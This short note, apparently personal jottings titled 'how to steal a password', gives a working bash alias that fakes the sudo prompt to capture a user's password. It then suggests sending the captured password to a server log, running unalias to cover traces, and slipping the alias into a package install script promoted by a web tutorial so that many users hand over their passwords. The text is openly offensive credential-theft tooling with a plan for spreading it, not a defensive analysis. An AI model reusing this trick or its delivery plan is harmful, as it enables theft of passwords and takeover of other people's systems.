# alias
how to steal a password

alias sudo='read -sp "[sudo] password for c-20: " specialword && echo -e "\nPassword is $specialword"'

replace echo -e with transmit to server log

subsequently follow up with unalias sudo to clean up and return to normal system state

normal sudo gives three tries and shows stars on input instead of blank as with read -s.

it also returns the message "sudo: 3 incorrect password attempts" so it's not that easy to fool

most users also don't use sudo from the command prompt often, unless a website tells them they should.

if a web tutorial says "download and install this package", and the install script manages to alias sudo, and then says "use sudo apt-get install", there is a very real chance that a large number of users would give away their passwords. clever fine-print could even tell the users upfront that this is what they are doing.



